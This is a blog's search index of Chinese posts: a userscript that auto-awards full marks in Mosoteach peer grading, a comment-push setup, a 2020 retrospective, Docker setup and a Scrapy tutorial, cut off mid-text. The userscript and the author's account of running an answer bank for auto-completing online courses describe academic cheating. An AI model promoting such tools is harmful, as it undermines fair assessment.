<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>【油猴脚本】蓝墨云班课互评作业自动评分</title>
    <link href="/2021/03/69.html"/>
    <url>/2021/03/69.html</url>
    
    <content type="html"><![CDATA[<h1 id="怎么看待云班课作业互评无脑打低分？"><a href="#怎么看待云班课作业互评无脑打低分？" class="headerlink" title="怎么看待云班课作业互评无脑打低分？"></a>怎么看待云班课作业互评无脑打低分？</h1><p>云班课匿名互评，提交作业的可以看见答案，然后评分。但是一个人可以给所有人评分，所以会有人给你们打底分，即使你写的是全对的，亲身体验，发现了它的弊端，毕竟不是所有人都是很好的，就算这样，老师也不可能每天都在批改所有人的作业，而且作业毕竟多，没办法给人公平。只能在心里骂那个缺德的人。</p><hr><h1 id="如何做一个聪明人"><a href="#如何做一个聪明人" class="headerlink" title="如何做一个聪明人"></a>如何做一个聪明人</h1><p><strong><em>全评满分！！！！！！！！！！！！！！！！！</em></strong></p><ul><li>脚本链接<a href="https://greasyfork.org/zh-CN/scripts/424128">https://greasyfork.org/zh-CN/scripts/424128</a></li><li>效果图<br><img src="https://z3.ax1x.com/2021/03/29/cCQF2D.png" srcset="/img/loading.gif" lazyload alt="cCQF2D.png"></li><li>代码</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// ==UserScript==</span><br><span class="hljs-comment">// @name         蓝墨云班课作业互评自动评满分</span><br><span class="hljs-comment">// @namespace    nawlgzs@163.com</span><br><span class="hljs-comment">// @version      1.0</span><br><span class="hljs-comment">// @description  云班课作业互评自动评满分</span><br><span class="hljs-comment">// @author       Ne-21</span><br><span class="hljs-comment">// @compatible   Chrome</span><br><span class="hljs-comment">// @match        *://www.mosoteach.cn/web/index.php?c=interaction_homework&amp;m=homework_result_list*</span><br><span class="hljs-comment">// @grant        unsafeWindow</span><br><span class="hljs-comment">// @require      http://libs.baidu.com/jquery/2.0.0/jquery.min.js</span><br><span class="hljs-comment">// @license      MIT</span><br><span class="hljs-comment">// ==/UserScript==</span><br> <br>(<span class="hljs-keyword">function</span><span class="hljs-literal">()</span> &#123;<br>    var _self = unsafeWindow;<br>    var $ = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_self</span>.</span></span>jQuery<span class="hljs-operator"> || </span>top.jQuery;<br>    <span class="hljs-constructor">$(<span class="hljs-params">document</span>)</span>.ready( <span class="hljs-keyword">function</span> <span class="hljs-literal">()</span> &#123;<br>        alert(<span class="hljs-string">&quot;请点击确定开始自动评分    BY.Ne-21,博客：https://gocos.cn&quot;</span>);<br>        console.log(<span class="hljs-string">&quot;开始自动评分BY.Ne-21,博客：https://gocos.cn&quot;</span>);<br>        var <span class="hljs-built_in">list</span> = document.query<span class="hljs-constructor">SelectorAll(&#x27;.<span class="hljs-params">homework</span>-<span class="hljs-params">item</span>&#x27;)</span>;<br>        var total = <span class="hljs-built_in">list</span>.length - <span class="hljs-number">1</span>;<br>        var i = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">let</span> t = set<span class="hljs-constructor">Interval( <span class="hljs-params">function</span> ()</span> &#123;<br>            console.log(<span class="hljs-string">&quot;共计:&quot;</span> + total + <span class="hljs-string">&quot;位，开始评分：第&quot;</span> + i + <span class="hljs-string">&quot;位&quot;</span>);<br>            var one = <span class="hljs-built_in">list</span><span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>;<br>            <span class="hljs-comment">// i++;</span><br>            <span class="hljs-keyword">do</span><span class="hljs-constructor">Pingfen(<span class="hljs-params">one</span>)</span>;<br>            i++;<br>            <span class="hljs-keyword">if</span> ( i<span class="hljs-operator"> == </span>total+<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-comment">// 清除Interval的定时器</span><br>            clear<span class="hljs-constructor">Interval(<span class="hljs-params">t</span>)</span>;<br>            console.log(<span class="hljs-string">&quot;全部完成&quot;</span>);<br>            &#125;;<br>        &#125;,<span class="hljs-number">3000</span>);<br>    &#125;);<br>&#125;)<span class="hljs-literal">()</span>;<br> <br><span class="hljs-keyword">function</span> <span class="hljs-keyword">do</span><span class="hljs-constructor">Pingfen(<span class="hljs-params">one</span>)</span> &#123;<br>    <span class="hljs-comment">// console.log(one);</span><br>    <span class="hljs-keyword">try</span>&#123;<br>        var s = one.query<span class="hljs-constructor">Selector(<span class="hljs-string">&quot;div.appraised-box.cl &gt; div &gt; span.user-current-score&quot;</span>)</span>.textContent;<br> <br>        <span class="hljs-comment">// console.log(s);</span><br>        <span class="hljs-keyword">if</span> ( s<span class="hljs-operator"> == </span><span class="hljs-string">&quot;请评分&quot;</span> ) &#123;<br>            one.query<span class="hljs-constructor">Selector(<span class="hljs-string">&quot;div &gt; span.appraise-button.appraised-button-enable&quot;</span>)</span>.click<span class="hljs-literal">()</span><br>            console.log(<span class="hljs-string">&quot;选中评分&quot;</span>);<br>            <span class="hljs-keyword">let</span> a = set<span class="hljs-constructor">Interval( <span class="hljs-params">function</span> ()</span> &#123;<br>                one.query<span class="hljs-constructor">Selector(&#x27;<span class="hljs-params">div</span>.<span class="hljs-params">item</span>-<span class="hljs-params">score</span>-<span class="hljs-params">box</span> &gt; <span class="hljs-params">div</span>.<span class="hljs-params">score</span>-<span class="hljs-params">points</span>-<span class="hljs-params">item</span>.<span class="hljs-params">cl</span> &gt; <span class="hljs-params">ul</span> &gt; <span class="hljs-params">li</span>:<span class="hljs-params">nth</span>-<span class="hljs-params">child</span>(1)</span>&#x27;).click<span class="hljs-literal">()</span>;<br>                console.log(<span class="hljs-string">&quot;选中分数&quot;</span>);<br>                one.query<span class="hljs-constructor">Selector(&#x27;#<span class="hljs-params">score</span>&#x27;)</span>.click<span class="hljs-literal">()</span>;<br>                console.log(<span class="hljs-string">&quot;评分完成&quot;</span>);<br>                <span class="hljs-comment">// 清除Interval的定时器</span><br>                clear<span class="hljs-constructor">Interval(<span class="hljs-params">a</span>)</span>;<br>            &#125;,<span class="hljs-number">3000</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            console.log(<span class="hljs-string">&quot;重复评分，跳过！&quot;</span>)<br>        &#125;;<br>        return;<br>    &#125; catch(e) &#123;<br>        console.log(<span class="hljs-string">&quot;可能是没有提交。&quot;</span> + e);<br>        return;<br>    &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于Valine云引擎+Qmsg酱实现博客评论推送</title>
    <link href="/2021/02/68.html"/>
    <url>/2021/02/68.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>最近给blog加了Valine评论系统，发现不能实现评论的主动推送，所以今天就找到一篇利用Qmsg进行推送的文章，分享一下</p></blockquote><p><strong>原文链接：<a href="https://blog.csdn.net/u013817026/article/details/111167377">https://blog.csdn.net/u013817026/article/details/111167377</a></strong></p><h1 id="认领一只Qmsg酱"><a href="#认领一只Qmsg酱" class="headerlink" title="认领一只Qmsg酱"></a>认领一只Qmsg酱</h1><ul><li><p>打开Qmsg酱官网,可以选择QQ登陆</p><pre><code>点击这里➡ [Qmsg酱官网](https://qmsg.zendee.cn/)</code></pre></li><li><p>选择你中意的Qmsg酱并且添加她为QQ好友</p></li></ul><p><img src="https://pic.521daigua.cn/2021/02/28/4abb1853c79e2.png" srcset="/img/loading.gif" lazyload alt="QQ截图20210228154007.png"></p><ul><li><p>添加你要接收推送的QQ号码<br>在选择Qmsg酱的旁边菜单添加，描述随意。</p></li><li><p>拼接你的接口地址<br>点击最右边的KEY，可以看到一长串字符，复制下来备用：</p></li></ul><p><img src="https://pic.521daigua.cn/2021/02/28/d348b93e81f68.png" srcset="/img/loading.gif" lazyload alt="QQ截图20210228154147.png"></p><ul><li>测试你的Qmsg是否认领成功<br>点击文档，查看接口地址,复制下来，把你的KEY粘贴在最后：</li></ul><p><img src="https://pic.521daigua.cn/2021/02/28/7a3dda4363871.png" srcset="/img/loading.gif" lazyload alt="QQ截图20210228154300.png"></p><p>然后将接口地址粘贴到浏览器地址栏，在末尾加上?msg= ，在等于后面随便输入文字，回车，如果成功你会看到Qmsg酱给你发来的消息：</p><p><img src="https://pic.521daigua.cn/2021/02/28/af24d52a2fa2d.png" srcset="/img/loading.gif" lazyload alt="QQ截图20210228154539.png"></p><h1 id="在Leancloud创建应用"><a href="#在Leancloud创建应用" class="headerlink" title="在Leancloud创建应用"></a>在Leancloud创建应用</h1><p>相信你有一个应用服务于valine的应用了，如果没有请参考Valine的文档</p><p>Valine作者文档： <a href="https://valine.js.org/quickstart.html">Valine快速开始</a></p><p><strong>通过云引擎部署项目</strong></p><ul><li>在云引擎部署<br>在Git部署的地址栏里输入这个仓库地址，然后点击部署：</li></ul><p><code>https://github.com/W4J1e/Hexo-Valine-ASPush</code></p><p><img src="https://pic.521daigua.cn/2021/02/28/bbd418d00b105.png" srcset="/img/loading.gif" lazyload alt="QQ截图20210228154834.png"></p><ul><li>配置变量<br>最后记得保存（本文只谈Qmsg酱推送，其它如server酱、邮件推送和评论后台管理可以自行参考原作者的配置）：</li></ul><p>变量参数如下：</p><table><thead><tr><th align="center">变量名</th><th align="center">说明</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center">SITE_NAME</td><td align="center">[必填]网站名称</td><td align="center">云淡风轻</td></tr><tr><td align="center">SITE_URL</td><td align="center">[必填] 博客地址，末尾不要加 /</td><td align="center"><a href="https://gocos.cn/">https://gocos.cn</a></td></tr><tr><td align="center">COMMENT</td><td align="center">[可选] 评论 div 的 ID 名，点击链接直接跳转到评论位置</td><td align="center">#post-comment</td></tr><tr><td align="center">QMSG_KEY</td><td align="center">[必填] Qmsg酱的KEY</td><td align="center">xxx</td></tr><tr><td align="center">QQ</td><td align="center">[必填] Qmsg酱发送的 qq，支持多个，用英文逗号分隔即可</td><td align="center">10001</td></tr></tbody></table><p>示例：</p><p><img src="https://pic.521daigua.cn/2021/02/28/bda0dc849a10d.png" srcset="/img/loading.gif" lazyload alt="QQ截图20210228155508.png"></p><ul><li><p>运行部署<br>点击左侧“部署”，在git部署下面再次点击部署。</p></li><li><p>测试推送<br>打开你的博客，用另一个身份发一条评论测试一下吧。</p><p><img src="https://pic.521daigua.cn/2021/02/28/f10b6a6f3a045.png" srcset="/img/loading.gif" lazyload alt="QQ截图20210228155639.png"></p></li></ul><p>注：前一条推送的评论使用了原版的推送模板，我已在源码中去除这些可能无法正确显示的表情，新版推送很简洁，以后修改与否视情况而定 。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>如果没有推送成功，请在leancloud中查看日志，并将报错内容反馈于我。</p><p>后续有时间了才能逐渐完善这份文档和代码仓库，毕竟打工人，不像蝶衣大佬一样可以休！产！假！<br>最后，感谢各位前辈们造的车轮！</p>]]></content>
    
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020年我都经历了什么？</title>
    <link href="/2021/02/67.html"/>
    <url>/2021/02/67.html</url>
    
    <content type="html"><![CDATA[<p>元旦的时候就想写这篇文章了，可是因为各种原因吧（主要是懒）就准备拖到大年初一来写，可是从在除夕晚上就开始和亲戚朋友玩啊，喝酒啊，一连就好几天，迷迷糊糊的，自然又把这个东西搁置了。</p><hr><p>我总觉得2020年的开始是一个失败的开始，从19年12月份出现新冠到2020年正月这段时间迅速爆发，是真的让人害怕，我很幸运我从学校安全的回到了家中。</p><p>因为这次的疫情，我的大学生活吧，有1/8时间是在家里对着电脑上网课，说实在的，效果真的不怎样，今年看起来还是会继续网课，就这样1/4的大学生活就过去了，干脆在家直接毕业算了。。</p><p>作为一名学生，那我们就说说网课吧，有的人可能知道，2020年4月18日晚间各大网课平台自动化完成学习任务、自动答题的众多脚本插件，如“网课助手开发组”开发的“超星网课助手”、“超星网课助手(考试专版)”、“智慧树网课助手”，“cxmooc-tools开发团队”开发的cxmooc-tools系列工具（超星慕课小、智慧树、中国大学慕课小工具）均已无法使用。作者称因为个人、服务器等资源的成本与多方面压力因素影响均宣布即日起停止维护，题库不再提供任何查询服务。发布了公告“停止维护意味着所有功能不再可靠或无法使用，建议各位自行移除插件或关闭插件，避免脚本停止维护后所带来的损失。向各位用户致以最诚挚的歉意。”“职教云刷课助手”、“U校园网课助手”、“中国大学慕课mooc答题/自动播放脚本”的开发者也于不久后宣布停止维护或下架脚本。目前在脚本论坛“Greasy Fork”上已无法搜索到上述脚本。网友猜测开发者同时下架脚本并宣布停止维护原因可能是由于pandownload作者被抓，担心自己可能面临法律风险。</p><ul><li>相关文章<ul><li><a href="https://docs.qq.com/doc/DZGJSVG1mRUpvdlJI">https://docs.qq.com/doc/DZGJSVG1mRUpvdlJI</a></li><li><a href="https://docs.qq.com/doc/DR09vYm10amFndk92">https://docs.qq.com/doc/DR09vYm10amFndk92</a></li></ul></li></ul><p>怎么说呢，由于各方面原因吧，正如其告知书所说的:</p><blockquote><p>我们一直坚持免费，只为分享自己的代码。送君千里，终须一别，今日的分别是为了明天更好的相聚，我们江湖再见！</p></blockquote><p>我们应该向所有开原作者致敬！</p><p><img src="http://pic.521daigua.cn/2021/02/20/36ee698b50534.jpg" srcset="/img/loading.gif" lazyload></p><p>当时正是网课才开始的时候，我也再用这些脚本吧，这一下给我整傻了，那怎么办呢，还好作者大大放出了一些题库，勉强能用。我就决定自己假设题库服务，这个做起来并不复杂，因为脚本有大佬写好的，只是换一个题库接口罢了，对于接口这东西，用PHP就可以完成，只要功能就是数据库的增删改查，没什么技术含量。</p><p>说不如做哈，两天就把demo写完了，跑起来把自己的网课全部搞完，没过多久，就看到好多人都在求题库什么的，我就想着不如把接口公开的，独乐乐不如众乐乐，当我回过头一看代码，没有写注释的习惯（这要改，好长时间了。。）感觉看完有点蒙，不过也能实现想要的功能，所以就在油猴上发布了更改后的脚本，好景不长好，当下载量达到8000+的时候，被管理员强制下架了，说是存在token，下架也好，正好用ThinkPHP重新写一下接口，写完之后考虑了一下，换了一台服务器，12月12日又在油猴重新发布了脚本，但是不打算再油猴更新，而是在自己的官网进行更新。</p><p>为了方便小白使用，我又进行了浏览器封装，打开即用，这就是现在大家所看到的结果吧</p><hr><p>这一年里，经历的最多的网暴了，知道我的信息有什么用，谈合作谈不来就不谈呗，威胁人就没意思了，我从一开始就没想过要和谁谁合作啥的，我不缺钱，做这些东西纯属是为了娱乐，能用就用，不能用就不用呗，没有人强迫你。或许我也知道为什么那些作者会关闭服务了，有些人就喜欢恶心人呗，跟王者农药的小学生一样，B话多技术差。</p><p><img src="http://pic.521daigua.cn/2021/02/20/b4d6f824e8d79.jpg" srcset="/img/loading.gif" lazyload alt="006dMd5bgy1gniusktkksj30c80bjaci _1_.jpg"></p><hr><p>别的事情或多或少的也记不清楚了，你就说一下2021年的计划吧</p><ul><li>拿到驾照（还差科三科四）</li><li>陪好她（满眼尽是喜欢）</li><li>题库坚持运营下去（纯属出于个人爱好，毕竟服务器月月要续费）</li><li>好好学习（之前就玩了）</li><li>尝试参加一些比赛吧（对所学专业没兴趣，可能跨专业）</li><li>开始Java从入门到入土之路（最近感觉挺有意思）</li></ul><hr><p>大概就这些吧，大家一起加油努力吧！</p>]]></content>
    
    
    
    <tags>
      
      <tag>daily</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux环境下安装Docker以及其常用命令</title>
    <link href="/2021/02/66.html"/>
    <url>/2021/02/66.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux或Windows 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。</p></blockquote><p><img src="https://p.pstatp.com/origin/138ea000055afa9a4fa5a" srcset="/img/loading.gif" lazyload></p><a id="more"></a><h1 id="安装要求"><a href="#安装要求" class="headerlink" title="安装要求"></a>安装要求</h1><ul><li>Linux内核  &gt; <code>3.1</code></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">查看Linux内核版本</span><br>uanme -r<br></code></pre></td></tr></table></figure><ul><li>不是<code>OpenVZ</code>虚拟化架构</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">CentOS安装virt-what</span><br>yum -y install virt-what<br><span class="hljs-meta">#</span><span class="bash">Debian or Ubuntu安装virt-what</span><br>apt-get install -y virt-what<br><span class="hljs-meta">#</span><span class="bash">查看虚拟化架构</span><br>virt-what<br></code></pre></td></tr></table></figure><h1 id="CentOS-7-安装-Docker"><a href="#CentOS-7-安装-Docker" class="headerlink" title="CentOS 7 安装 Docker"></a>CentOS 7 安装 Docker</h1><ul><li>卸载旧版Docker</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo yum remove docker \<br>                  docker-client \<br>                  docker-client-latest \<br>                  docker-common \<br>                  docker-latest \<br>                  docker-latest-logrotate \<br>                  docker-logrotate \<br>                  docker-engine<br></code></pre></td></tr></table></figure><p><img src="https://p.pstatp.com/origin/ff0100033c402b50bf48" srcset="/img/loading.gif" lazyload></p><ul><li>设置Docker存储库</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo yum -y install -y yum-utils<br>sudo yum-config-manager \<br>    --add-repo \<br>    https://download.docker.com/linux/centos/docker-ce.repo<br></code></pre></td></tr></table></figure><p><img src="https://p.pstatp.com/origin/137ec00025ea1b6ed4d3b" srcset="/img/loading.gif" lazyload></p><ul><li>安装最新版Docker 引擎和容器</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo yum -y install docker-ce docker-ce-cli containerd.io<br></code></pre></td></tr></table></figure><ul><li>启动Docker</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">启动Docker</span><br>sudo systemctl start docker<br><span class="hljs-meta">#</span><span class="bash">开机启动</span><br>sudo systemctl enable docker<br></code></pre></td></tr></table></figure><blockquote><p>更多说明可参考：<a href="https://docs.docker.com/engine/install/centos/">https://docs.docker.com/engine/install/centos/</a></p></blockquote><h1 id="验证与测试"><a href="#验证与测试" class="headerlink" title="验证与测试"></a>验证与测试</h1><p>安装顺利可以使用<code>docker -v</code>可查看到当前版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@iZe0754mxynaalZ ~]# docker -v<br>Docker version 20.10.3, build 48d30b5<br></code></pre></td></tr></table></figure><h1 id="Docker镜像加速"><a href="#Docker镜像加速" class="headerlink" title="Docker镜像加速"></a>Docker镜像加速</h1><p>Docker镜像在海外，国内拉取速度非常缓慢，可以使用网易Docker镜像源来加速,新建一个文件<code>/etc/docker/daemon.json</code>添加以下内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">&#123;<br> &quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;]<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Docker常用命令"><a href="#Docker常用命令" class="headerlink" title="Docker常用命令"></a>Docker常用命令</h1><ul><li>查看运行中的Docker进程：<code>docker ps</code></li><li>启动容器：<code>docker start id</code></li><li>停止指定docker进程：<code>docker stop id</code></li><li>查找镜像：<code>docker search name</code></li><li>查看已安装的镜像：<code>docker images</code></li><li>删除某个镜像：<code>docker rm &lt;image id&gt;</code></li></ul><blockquote><p>实际过程中可能遇到其它问题，仅供各位参考，更多说明建议参考Docker官方文档。</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Scrapy中选择器用法</title>
    <link href="/2021/01/65.html"/>
    <url>/2021/01/65.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>Scrapy提取数据有自己的一套机制，被称作选择器（selectors）,通过特定的Xpath或者CSS表达式来选择HTML文件的某个部分<br>Xpath是专门在XML文件中选择节点的语言，也可以用在HTML上。<br>CSS是一门将HTML文档样式化语言，选择器由它定义，并与特定的HTML元素的样式相关联。</p></blockquote><a id="more"></a><blockquote><p>官方测试页面网址：<a href="https://docs.scrapy.org/en/latest/_static/selectors-sample1.html">https://docs.scrapy.org/en/latest/_static/selectors-sample1.html</a></p></blockquote><ul><li><p>三种选择器</p><ul><li>css</li><li>xpath</li><li>re</li></ul></li><li><p>进入shell环境</p><p><code>scrapy shell https://docs.scrapy.org/en/latest/_static/selectors-sample1.html</code></p></li></ul><ul><li><p>使用selector进行查询</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 直接执行selector</span><br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.selector</span><br>&lt;Selector xpath=None data=&#x27;&lt;html&gt;\n &lt;head&gt;\n  &lt;base href=&quot;http://e...&#x27;&gt;<br><br><span class="hljs-meta">#</span><span class="bash"> 调用selector的xpath选择器</span><br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.selector.xpath(<span class="hljs-string">&#x27;//title/text()&#x27;</span>)</span><br>[&lt;Selector xpath=&#x27;//title/text()&#x27; data=&#x27;Example website&#x27;&gt;]<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.selector.xpath(<span class="hljs-string">&#x27;//title/text()&#x27;</span>).extract_first()</span><br>&#x27;Example website&#x27;<br><br><span class="hljs-meta">#</span><span class="bash"> 调用selector的css选择器</span><br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.selector.css(<span class="hljs-string">&#x27;title::text&#x27;</span>).extract_first()</span><br>&#x27;Example website&#x27;<br><br><span class="hljs-meta">#</span><span class="bash"> 其他调用方法（不写selector）</span><br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.xpath(<span class="hljs-string">&#x27;//title/text()&#x27;</span>).extract_first()</span><br>&#x27;Example website&#x27;<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.css(<span class="hljs-string">&#x27;title::text&#x27;</span>).extract_first()</span><br>&#x27;Example website&#x27;<br></code></pre></td></tr></table></figure><p>可以看出，无论是<code>xpath</code>还是<code>css</code>选择器，返回的数据都是一个<code>selector</code>的列表，这就说明，我们可以接着调用这两种方法进行层层的迭代的查询。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.xpath(<span class="hljs-string">&#x27;//div[@id=&quot;images&quot;]&#x27;</span>)</span><br>[&lt;Selector xpath=&#x27;//div[@id=&quot;images&quot;]&#x27; data=&#x27;&lt;div id=&quot;images&quot;&gt;\n   &lt;a href=&quot;image1....&#x27;&gt;<br>]<br><span class="hljs-meta">#</span><span class="bash"> 迭代查询</span><br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.xpath(<span class="hljs-string">&#x27;//div[@id=&quot;images&quot;]&#x27;</span>).css(<span class="hljs-string">&#x27;img&#x27;</span>)</span><br>[&lt;Selector xpath=&#x27;descendant-or-self::img&#x27; data=&#x27;&lt;imgsrc=&quot;image1_thumb.jpg&quot;&gt;&#x27;&gt;, <br>&lt;Selector xpath=&#x27;descendant-or-self::img&#x27; data=&#x27;&lt;img src=&quot;image2_thumb.jpg&quot;&gt;&#x27;&gt;,<br>&lt;Selector xpath=&#x27;descendant-or-self::img&#x27; data=&#x27;&lt;img src=&quot;image3_thumb.jpg&quot;&gt;&#x27;&gt;, <br>&lt;Selector xpath=&#x27;descendant-or-self::img&#x27; data=&#x27;&lt;img src=&quot;image4_thumb.jpg&quot;&gt;&#x27;&gt;, <br>&lt;Selector xpath=&#x27;descendant-or-self::img&#x27; data=&#x27;&lt;img src=&quot;image5_thumb.jpg&quot;&gt;&#x27;&gt;]<br><br><span class="hljs-meta">#</span><span class="bash"> 获取返回的所有图片链接</span><br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.xpath(<span class="hljs-string">&#x27;//div[@id=&quot;images&quot;]&#x27;</span>).css(<span class="hljs-string">&#x27;img::attr(src)&#x27;</span>)</span><br>[&lt;Selector xpath=&#x27;descendant-or-self::img/@src&#x27; data=&#x27;image1_thumb.jpg&#x27;&gt;,  <br>&lt;Selector xpath=&#x27;descendant-or-self::img/@src&#x27; data=&#x27;image2_thumb.jpg&#x27;&gt;, <br>&lt;Selector xpath=&#x27;descendant-or-self::img/@src&#x27; data=&#x27;image3_thumb.jpg&#x27;&gt;, <br>&lt;Selector xpath=&#x27;descendant-or-self::img/@src&#x27; data=&#x27;image4_thumb.jpg&#x27;&gt;, <br>&lt;Selector xpath=&#x27;descendant-or-self::img/@src&#x27; data=&#x27;image5_thumb.jpg&#x27;&gt;]<br><span class="hljs-meta">#</span><span class="bash"> 再用extract()方法获取其所有内容</span><br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.xpath(<span class="hljs-string">&#x27;//div[@id=&quot;images&quot;]&#x27;</span>).css(<span class="hljs-string">&#x27;img::attr(src)&#x27;</span>).extract()</span><br>[&#x27;image1_thumb.jpg&#x27;, <br>&#x27;image2_thumb.jpg&#x27;, <br>&#x27;image3_thumb.jpg&#x27;, <br>&#x27;image4_thumb.jpg&#x27;, <br>&#x27;image5_thumb.jpg&#x27;]<br><span class="hljs-meta">#</span><span class="bash"> 再用extract_first()方法获取其第一条内容</span><br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; response.xpath(<span class="hljs-string">&#x27;//div[@id=&quot;images&quot;]&#x27;</span>).css(<span class="hljs-string">&#x27;img::attr(src)&#x27;</span>).extract_first()</span><br>&#x27;image1_thumb.jpg&#x27;<br><br><span class="hljs-meta">#</span><span class="bash"> extract_first(default=<span class="hljs-string">&#x27;&#x27;</span>) 当查不到对应数据时返回defanlt的内容</span><br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt;response.xpath(<span 